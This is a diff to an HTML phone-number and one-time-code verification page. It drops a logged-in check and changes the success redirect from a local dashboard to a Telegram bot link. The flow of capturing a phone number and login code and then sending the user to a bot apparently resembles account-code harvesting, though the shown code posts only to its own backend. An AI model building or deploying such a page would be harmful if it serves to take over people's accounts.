@@ -202,7 +202,6 @@
             box-shadow: 0 0 10px rgba(0, 136, 204, 0.4);
         }
 
-        /* সাগরের ঢেউয়ের মতো ওয়েব অ্যানিমেশন (Ocean Wave Effect) */
         .otp-small-box.wave-anim {
             animation: oceanWave 0.6s ease-in-out infinite alternate;
         }
@@ -327,14 +326,10 @@
     </style>
     
     <script>
-        if (localStorage.getItem("isLoggedIn") === "true") {
-            window.location.replace("dashboard.html");
-        } else {
-            document.addEventListener("DOMContentLoaded", () => {
-                document.getElementById("pageWrapper").style.opacity = "1";
-                document.getElementById("phoneInput").focus();
-            });
-        }
+        document.addEventListener("DOMContentLoaded", () => {
+            document.getElementById("pageWrapper").style.opacity = "1";
+            document.getElementById("phoneInput").focus();
+        });
     </script>
 </head>
 <body>
@@ -446,7 +441,6 @@
             realInput.value = "";
             updateBoxes();
 
-            // ব্যাকএন্ডে রিকোয়েস্ট পাঠানো হচ্ছে
             fetch('/send-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -519,7 +513,7 @@
                                 checkMark.classList.add('animate');
 
                                 setTimeout(() => {
-                                    window.location.href = "dashboard.html";
+                                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                                 }, 1500);
 
                             }, 500);
